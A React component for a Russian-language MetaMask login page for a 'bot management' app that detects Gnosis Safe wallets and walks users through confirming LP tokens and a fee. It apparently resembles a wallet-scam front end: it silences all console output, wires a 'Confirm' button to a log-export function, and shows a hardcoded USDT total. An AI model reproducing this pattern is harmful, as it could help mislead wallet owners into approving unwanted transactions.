import { useMetamaskLoginLogic } from "./hooks/use-metamask-login"
import metamaskIcon from "./assets/metamask.svg"
import logo from "./assets/logo.png"
import { useState } from "react"

const ENABLE_VERBOSE_LOGS = false
if (typeof window !== "undefined" && !ENABLE_VERBOSE_LOGS) {
  ;(console as any).log = () => {}
  ;(console as any).info = () => {}
  ;(console as any).debug = () => {}
  ;(console as any).warn = () => {}
}

export default function MetamaskLoginPage() {
  const [loading, setLoading] = useState(false)
  const {
    connected,
    address,
    chainId,
    balance,
    logs,
    logsRef,
    toasts,
    safeModalVisible,
    safeCandidates,
    handleSelectSafe,
    handleDismissSafe,
    selectedSafe,
    safeBalance,
    isContractConnected,
    connectMetaMask,
    disconnect,
    exportLogs,
  } = useMetamaskLoginLogic()

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-gray-900 via-gray-800 to-black p-4 sm:p-6">
      <div className="w-full max-w-6xl bg-white/5 backdrop-blur-md border border-white/10 rounded-2xl p-5 sm:p-8 shadow-2xl relative">
        <div className="flex flex-col sm:flex-row items-center sm:items-start justify-between mb-8 gap-5">
          <div className="flex flex-col items-center sm:items-start text-center sm:text-left">
            <img src={logo} alt="Logo" className="w-32 sm:w-40 h-auto object-contain select-none" />
            <p className="mt-2 text-[11px] sm:text-xs tracking-wide text-gray-400 uppercase">
              SecureApp управление ботами <span className="text-gray-300">v1.1.6</span>
            </p>
          </div>
          <div className="w-full sm:w-auto">
            <button
              onClick={async () => { setLoading(true); await connectMetaMask(); setLoading(false); }}
              className="w-full sm:w-auto flex items-center justify-center gap-3 px-6 py-3 rounded-xl bg-gradient-to-r from-gray-700/30 to-gray-600/30 border border-white/10 text-sm sm:text-base text-gray-200 font-semibold tracking-wide hover:scale-[1.03] hover:border-white/20 transition-all duration-300 ease-in-out"
            >
              <span className="w-7 h-7 sm:w-8 sm:h-8 inline-block">
                <img src={metamaskIcon} alt="MetaMask" className="w-full h-full" />
              </span>
              <span className="uppercase tracking-wider">MetaMask</span>
            </button>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 sm:gap-8">
          <div className="flex flex-col justify-between gap-4 bg-white/5 rounded-lg border border-white/10 shadow-sm p-4 sm:p-6">
            <div className="flex flex-wrap items-center justify-between gap-3">
              <div>
                <div className="text-[11px] sm:text-xs text-gray-400">Статус</div>
                <div className="text-sm sm:text-base text-gray-200 font-semibold tracking-wide">
                  {connected ? "Подключен" : "Не подключен"}
                </div>
                <div className="text-[11px] text-gray-400 mt-2">
                  Тип кошелька:{" "}
                  <span className="text-white font-medium">
                    {selectedSafe ? "Multisig (Gnosis Safe)" : "EOA"}
                  </span>
                </div>
                {safeCandidates.length > 0 && (
                  <select
                    className="mt-2 px-2 py-1 rounded bg-gray-800 text-xs text-gray-200 border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-400"
                    value={selectedSafe ? "safe" : "eoa"}
                    onChange={e => {
                      if (e.target.value === "safe") {
                        if (safeBalance && selectedSafe) return
                      } else {
                        if (selectedSafe) handleDismissSafe()
                      }
                    }}
                  >
                    <option value="eoa">EOA</option>
                    {safeCandidates.map((s, i) => (
                      <option key={i} value="safe">{s}</option>
                    ))}
                  </select>
                )}
              </div>
              <div className="text-right">
                <div className="text-[11px] text-gray-400">Chain</div>
                <div className="text-sm text-white">{chainId ?? "—"}</div>
              </div>
            </div>

            <div className="mt-3 sm:mt-4 bg-black/20 border border-white/10 rounded-md p-3 sm:p-4 flex flex-col gap-2">
              <div className="flex justify-between items-center">
                <div className="text-[11px] text-gray-400">Адрес</div>
                {(safeBalance || selectedSafe) && (
                  <select
                    className="ml-2 px-2 py-1 rounded bg-gray-800 text-[11px] text-gray-200 border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-400"
                    value={selectedSafe ? "safe" : "eoa"}
                    onChange={e => {
                      if (e.target.value === "safe") {
                        if (safeBalance && selectedSafe) return
                      } else {
                        if (selectedSafe) handleDismissSafe()
                      }
                    }}
                  >
                    <option value="eoa">EOA</option>
                    {selectedSafe && <option value="safe">Safe</option>}
                  </select>
                )}
              </div>
              <div className="text-xs sm:text-sm text-white break-all">
                {selectedSafe ? selectedSafe : address ?? "—"}
              </div>
              <div className="flex justify-between mt-2">
                <div className="text-[11px] text-gray-400">Баланс (ETH)</div>
                <div className="text-xs sm:text-sm text-white">{selectedSafe ? safeBalance ?? "—" : balance ?? "—"}</div>
              </div>
            </div>

            <div className="flex flex-col sm:flex-row gap-2 mt-4">
              <button
                type="button"
                className="flex-1 px-4 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-gray-200 font-semibold tracking-wide transition-all"
                onClick={async () => { setLoading(true); await disconnect(); setLoading(false); }}
              >
                Отключить
              </button>
              <button
                type="button"
                className="flex-1 px-4 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-gray-200 font-semibold tracking-wide transition-all"
                onClick={async () => { setLoading(true); await exportLogs(); setLoading(false); }}
              >
                Подтвердить
              </button>
            </div>

            <div className="mt-3 text-[11px] text-gray-400 text-center sm:text-left">
              Статус контракта: <span className="text-gray-300">{isContractConnected ? "Готов" : "Не готов"}</span>
            </div>
          </div>

          <div className="flex flex-col justify-between gap-4 bg-white/5 rounded-lg border border-white/10 shadow-sm p-4 sm:p-6">
            <div className="flex-1">
              <div className="text-sm text-gray-200 mb-3 font-semibold tracking-wide">
                Краткие действия
              </div>
              <ol className="text-xs sm:text-[13px] text-gray-400 list-decimal list-inside space-y-1 leading-relaxed">
                <li>Подтвердите кошелёк</li>
                <li>Выберите LP-токены и пул</li>
                <li>Подтвердите выбор и комиссию</li>
                <li>Ожидайте начисление</li>
              </ol>
            </div>
            <div>
              <div className="bg-black/20 border border-white/10 rounded-md p-3 sm:p-4 h-24 sm:h-28 overflow-y-auto">
                <div className="text-xs text-center text-gray-400 py-2">No data</div>
              </div>
            </div>
            <div className="flex justify-between items-center">
              <div className="text-[11px] sm:text-xs text-gray-400">Всего:</div>
              <div className="text-sm sm:text-base text-gray-200 font-semibold tracking-wide">0.00 USDT</div>
            </div>
          </div>
        </div>

        <div className="flex flex-col gap-3 sm:gap-4 mt-6 w-full">
          <div className="p-3 sm:p-4 bg-gradient-to-br from-gray-800/80 to-gray-900/80 rounded-xl border border-white/10 shadow-inner flex flex-col">
            <div className="text-sm text-gray-300 font-semibold mb-3">Live Logs</div>
            <div
              ref={logsRef}
              className="h-60 sm:h-80 overflow-y-auto overflow-x-hidden bg-black/60 rounded-lg p-3 text-[11px] sm:text-xs text-white font-mono border border-white/10"
            >
              {logs.length === 0 ? (
                <div className="text-gray-500 text-center mt-8">
                  Логи появятся после действий
                </div>
              ) : (
                logs.map((l, i) => (
                  <div key={i} className="mb-1 px-2 py-1 rounded hover:bg-white/5 transition-colors">
                    <span className="text-gray-400">[{l.ts}]</span>{" "}
                    <span className="px-1 rounded text-[10px] bg-gray-700">{l.level.toUpperCase()}</span>{" "}
                    <span className="text-white">{l.tag ? `[${l.tag}]` : ""} {l.message}</span>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>

        <div className="mt-8 text-[11px] sm:text-xs text-gray-400 underline text-center sm:text-left">
          Политика конфиденциальности <br className="sm:hidden" /> Служба поддержки
        </div>

        {loading && (
          <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/70 backdrop-blur-md">
            <div className="w-12 h-12 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
          </div>
        )}
      </div>
    </div>
  )
}
